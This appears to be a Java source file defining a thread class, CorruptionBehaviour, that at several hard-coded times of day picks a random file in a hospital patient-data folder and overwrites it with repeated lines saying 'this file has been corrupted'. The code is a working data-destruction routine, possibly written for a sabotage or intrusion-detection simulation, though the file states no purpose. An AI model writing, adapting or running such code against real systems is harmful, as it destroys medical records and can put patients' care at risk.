
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalTime;
import java.util.Random;

public class CorruptionBehaviour extends Thread {
	private final static String BASE_PATH = "/hospital_files/patients_data/";

	public void run() {
		System.out.println("corruption thread running");
		while (true) {
			try {

				if (LocalTime.now().getHour() == 3 & LocalTime.now().getMinute() > 15
						& LocalTime.now().getMinute() < 18) {
					corruptFile();
				}
				if (LocalTime.now().getHour() == 1 & LocalTime.now().getMinute() > 40
						& LocalTime.now().getMinute() < 43) {
					corruptFile();
				}
				if (LocalTime.now().getHour() == 0 & LocalTime.now().getMinute() > 54
						& LocalTime.now().getMinute() < 57) {
					corruptFile();
				}
				if (LocalTime.now().getHour() == 10 & LocalTime.now().getMinute() > 2
						& LocalTime.now().getMinute() < 5) {
					corruptFile();
				}
				if (LocalTime.now().getHour() == 10 & LocalTime.now().getMinute() > 29
						& LocalTime.now().getMinute() < 32) {
					corruptFile();
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	private void corruptFile() throws IOException {
		File folder = new File(BASE_PATH);
		File[] files = folder.listFiles();
		Random rand = new Random();
		File randomFile = files[rand.nextInt(files.length)];

		FileWriter myWriter = new FileWriter(randomFile.getAbsolutePath());
		int fileLines = (int) (Math.round(15000 * Math.random()));
		for (int i = 1; i < fileLines; i++)
			myWriter.write("this file has been corrupted \n");
		myWriter.close();

	}
}
